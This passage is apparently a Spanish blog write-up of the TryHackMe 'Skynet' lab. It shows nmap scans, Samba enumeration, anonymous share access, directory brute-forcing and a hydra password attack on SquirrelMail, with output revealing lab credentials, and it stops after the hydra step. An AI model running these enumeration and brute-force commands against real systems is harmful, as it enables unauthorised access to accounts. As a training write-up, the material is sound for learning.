@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Skynet [TryHackMe]  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content='Burp, Dirb, Easy, Intruder, Linux, Metasploit, Meterpreter, msfvenom, Privilege Escalation, SMB, TryHackMe' />
+    
+    
+        <meta name="description" content="ento a la primera máquina de &amp;ldquo;Offensive Pentesting&amp;rdquo; que no tiene una guía paso a paso. En este caso, se trata de una máquina de nivel fácil, por lo que no debería ser muy complicada. El objetivo es obtener acceso a la máquina y obtener la flag del usuario y la flag del root." />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Skynet [TryHackMe]" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2023-09-01T00:00:00Z&#43;0000' />
+    
+        
+            <meta property="article:tag" content="Burp" />
+        
+            <meta property="article:tag" content="Dirb" />
+        
+            <meta property="article:tag" content="Easy" />
+        
+            <meta property="article:tag" content="Intruder" />
+        
+            <meta property="article:tag" content="Linux" />
+        
+            <meta property="article:tag" content="Metasploit" />
+        
+            <meta property="article:tag" content="Meterpreter" />
+        
+            <meta property="article:tag" content="msfvenom" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="SMB" />
+        
+            <meta property="article:tag" content="TryHackMe" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/skynet/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/game-zone/game-zone.jpeg
+        ' />
+    
+        <meta property="og:description" content="Introducción Me enfrento a la primera máquina de &amp;ldquo;Offensive Pentesting&amp;rdquo; que no tiene una guía paso a paso. En este caso, se trata de una máquina de " />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/skynet/" />
+
+
+    <meta name="twitter:title" content="Skynet [TryHackMe]" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/game-zone/game-zone.jpeg
+        ' />
+    
+        <meta name="twitter:description" content="Introducción Me enfrento a la primera máquina de &amp;ldquo;Offensive Pentesting&amp;rdquo; que no tiene una guía paso a paso. En este caso, se trata de una máquina de " />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:k3ssdev@proton.me">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3ssdev">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Skynet [TryHackMe]</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-09-01
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/game-zone/game-zone.jpeg" alt="" />
+            
+        </figure>
+    
+    
+    <div><h2 id="introducción">Introducción</h2>
+<p>Me enfrento a la primera máquina de &ldquo;Offensive Pentesting&rdquo; que no tiene una guía paso a paso. En este caso, se trata de una máquina de nivel fácil, por lo que no debería ser muy complicada. El objetivo es obtener acceso a la máquina y obtener la flag del usuario y la flag del root.</p>
+<h2 id="task-1---deploy-and-compromise-the-vulnerable-machine">Task 1 - Deploy and compromise the vulnerable machine!</h2>
+<h3 id="paso-1">Paso 1</h3>
+<ul>
+<li>Pongo la máquina en marcha y accedo a la aplicación web que tiene.</li>
+<li>Escaneo la máquina con un nmap en 2 pasos.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sS --min-rate <span style="color:#ae81ff">5000</span> -p- -Pn -v -oN nmap_inicial &lt;IP&gt; 
+</span></span><span style="display:flex;"><span>ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat nmap_inicial | grep <span style="color:#e6db74">&#39;^[0-9]&#39;</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f1 | xargs | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>sudo nmap -p$ports -sC -sV -Pn -oN nmap_final &lt;IP&gt; 
+</span></span></code></pre></div><ul>
+<li>Puertos de SSH, servidor web Apache, servidores de correo y Samba. Sistema operativo Linux Ubuntu.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http        Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Skynet
+</span></span><span style="display:flex;"><span>110/tcp open  pop3        Dovecot pop3d
+</span></span><span style="display:flex;"><span>|_pop3-capabilities: AUTH-RESP-CODE PIPELINING SASL CAPA UIDL TOP RESP-CODES
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>143/tcp open  imap        Dovecot imapd
+</span></span><span style="display:flex;"><span>|_imap-capabilities: more LOGIN-REFERRALS post-login LITERAL+ have Pre-login capabilities IDLE LOGINDISABLEDA0001 IMAP4rev1 SASL-IR listed ENABLE OK ID
+</span></span><span style="display:flex;"><span>445/tcp open  @NnU      Samba smbd 4.3.11-Ubuntu <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="paso-2">Paso 2</h3>
+<ul>
+<li>Enumero Samab con Enum4Linux y lo guardo en un fichero</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>enum4linux -a 10.10.126.64 &gt; samba_details
+</span></span></code></pre></div><ul>
+<li>Reviso los resultados.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">===================================(</span> OS information on 10.10.126.64 <span style="color:#f92672">)===================================</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">46</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">47</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">48</span>   │ <span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t get OS info with smbclient
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">49</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">50</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">51</span>   │ <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got OS info <span style="color:#66d9ef">for</span> 10.10.126.64 from srvinfo: 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">52</span>   │     SKYNET         Wk Sv PrQ Unx NT SNT skynet server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">53</span>   │     platform_id     :   <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">54</span>   │     os version      :   6.1
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">55</span>   │     server type     :   0x809a03
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">56</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">57</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">58</span>   │  <span style="color:#f92672">=======================================(</span> Users on 10.10.126.64 <span style="color:#f92672">)=======================================</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">59</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">60</span>   │ index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson   Name:   Desc: 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">61</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">62</span>   │ user:<span style="color:#f92672">[</span>milesdyson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x3e8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">63</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">64</span>   │  <span style="color:#f92672">=================================(</span> Share Enumeration on 10.10.126.64 <span style="color:#f92672">)=================================</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">65</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">66</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">67</span>   │     Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">68</span>   │     ---------       ----      -------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">69</span>   │     print$          Disk      Printer Drivers
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">70</span>   │     anonymous       Disk      Skynet Anonymous Share
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">71</span>   │     milesdyson      Disk      Miles Dyson Personal Share
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">72</span>   │     IPC$            IPC       IPC Service <span style="color:#f92672">(</span>skynet server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">73</span>   │ Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">74</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">75</span>   │     Server               Comment
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">76</span>   │     ---------            -------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">77</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">78</span>   │     Workgroup            Master
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">79</span>   │     ---------            -------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">80</span>   │     WORKGROUP            SKYNET
+</span></span></code></pre></div><ul>
+<li>Acceso  anonymous user con smbclient.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ smbclient //10.10.126.64/anonymous
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\k</span>3ss<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu Nov <span style="color:#ae81ff">26</span> 17:04:00 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 09:20:17 <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>  attention.txt                       N      <span style="color:#ae81ff">163</span>  Wed Sep <span style="color:#ae81ff">18</span> 05:04:59 <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>  logs                                D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 06:42:16 <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">9204224</span> blocks of size 1024. <span style="color:#ae81ff">5831500</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get attention.txt 
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\a</span>ttention.txt of size <span style="color:#ae81ff">163</span> as attention.txt <span style="color:#f92672">(</span>1,0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1,0 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>NT_STATUS_OBJECT_NAME_INVALID opening remote file <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\*</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get logs<span style="color:#ae81ff">\l</span>og
+</span></span><span style="display:flex;"><span>logs<span style="color:#ae81ff">\l</span>og1.txt  logs<span style="color:#ae81ff">\l</span>og2.txt  logs<span style="color:#ae81ff">\l</span>og3.txt  
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get logs<span style="color:#ae81ff">\l</span>og
+</span></span><span style="display:flex;"><span>logs<span style="color:#ae81ff">\l</span>og1.txt  logs<span style="color:#ae81ff">\l</span>og2.txt  logs<span style="color:#ae81ff">\l</span>og3.txt  
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get logs<span style="color:#ae81ff">\l</span>og1.txt
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\l</span>og1.txt of size <span style="color:#ae81ff">471</span> as logs<span style="color:#ae81ff">\l</span>og1.txt <span style="color:#f92672">(</span>3,1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2,1 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get logs<span style="color:#ae81ff">\l</span>og2.txt
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\l</span>og2.txt of size <span style="color:#ae81ff">0</span> as logs<span style="color:#ae81ff">\l</span>og2.txt <span style="color:#f92672">(</span>0,0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1,5 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get logs<span style="color:#ae81ff">\l</span>og3.txt
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\l</span>og3.txt of size <span style="color:#ae81ff">0</span> as logs<span style="color:#ae81ff">\l</span>og3.txt <span style="color:#f92672">(</span>0,0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1,2 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="paso-3">Paso 3</h3>
+<ul>
+<li>Enumero los directorios que haya en la web con dirb</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ dirb http://10.10.126.64/ /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>DIRB v2.22    
+</span></span><span style="display:flex;"><span>By The Dark Raver
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>START_TIME: Sat Sep  <span style="color:#ae81ff">2</span> 11:57:08 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>URL_BASE: http://10.10.126.64/
+</span></span><span style="display:flex;"><span>WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GENERATED WORDS: <span style="color:#ae81ff">4612</span>                                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---- Scanning URL: http://10.10.126.64/ ----
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.126.64/admin/                                                                                                                                               
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.126.64/config/                                                                                                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.126.64/css/                                                                                                                                                 
+</span></span><span style="display:flex;"><span>+ http://10.10.126.64/index.html <span style="color:#f92672">(</span>CODE:200|SIZE:523<span style="color:#f92672">)</span>                                                                                                                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.126.64/js/                                                                                                                                                  
+</span></span><span style="display:flex;"><span>+ http://10.10.126.64/server-status <span style="color:#f92672">(</span>CODE:403|SIZE:277<span style="color:#f92672">)</span>                                                                                                                                 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.126.64/squirrelmail/
+</span></span></code></pre></div><ul>
+<li>En squirrelmail hay un login, guardo el post request en un fichero</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /squirrelmail/src/redirect.php HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 10.10.126.64
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">81</span>
+</span></span><span style="display:flex;"><span>Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Origin: http://10.10.126.64
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/116.0.5845.111 Safari/537.36
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.7
+</span></span><span style="display:flex;"><span>Referer: http://10.10.126.64/squirrelmail/src/login.php
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Accept-Language: es-ES,es;q<span style="color:#f92672">=</span>0.9
+</span></span><span style="display:flex;"><span>Cookie: SQMSESSID<span style="color:#f92672">=</span>tn1nf3uvf4cm77sboeo2ssshg0
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>login_username<span style="color:#f92672">=</span>mylesdyson&amp;secretkey<span style="color:#f92672">=</span>test&amp;js_autodetect_results<span style="color:#f92672">=</span>1&amp;just_logged_in<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><ul>
+<li>Uso burp intruder y tambien hydra para probar todas las contraseñas (se puede usar cualquiera de los dos métodos).</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ hydra -l milesdyson -P /home/k3ss/Documentos/tryhackme/skynet/nmap/log1.txt 10.10.126.64 http-post-form <span style="color:#e6db74">&#34;/squirrelmail/src/login.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:Login failed&#34;</span> -V -t <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Hydra v9.5 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2023-09-02 12:27:55
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">4</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">4</span> tasks, <span style="color:#ae81ff">31</span> login tries <span style="color:#f92672">(</span>l:1/p:31<span style="color:#f92672">)</span>, ~8 tries per task
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.126.64:80/squirrelmail/src/login.php:login_username<span style="color:#f92672">=</span>^USER^&amp;secretkey<span style="color:#f92672">=</span>^PASS^&amp;js_autodetect_results<span style="color:#f92672">=</span>1&amp;just_logged_in<span style="color:#f92672">=</span>1:Login failed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.126.64 - login <span style="color:#e6db74">&#34;milesdyson&#34;</span> - pass <span style="color:#e6db74">&#34;cyborg007haloterminator&#34;</span> - <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">31</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.126.64 - login <span style="color:#e6db74">&#34;milesdyson&#34;</span> - pass <span style="color:#e6db74">&#34;terminator22596&#34;</span> - <span style="color:#ae81ff">2</span> of <span style="color:#ae81ff">31</span> <span style="color:#f92672">[</span>child 1<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.126.64 - login <span style="color:#e6db74">&#34;milesdyson&#34;</span> - pass <span style="color:#e6db74">&#34;terminator219&#34;</span> - <span style="color:#ae81ff">3</span> of <span style="color:#ae81ff">31</span> <span style="color:#f92672">[</span>child 2<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.126.64 - login <span style="color:#e6db74">&#34;milesdyson&#34;</span> - pass <span style="color:#e6db74">&#34;terminator20&#34;</span> - <span style="color:#ae81ff">4</span> of <span style="color:#ae81ff">31</span> <span style="color:#f92672">[</span>child 3<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.126.64   login: milesdyson   password: cyborg007haloterminator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.126.64   login: milesdyson   password: terminator22596
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.126.64   login: milesdyson   password: terminator219
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.126.64   login: milesdyson   password: terminator20
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">4</span> valid passwords found
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2023-09-02 12:27:55
+</span></span></code></pre></div><ul>
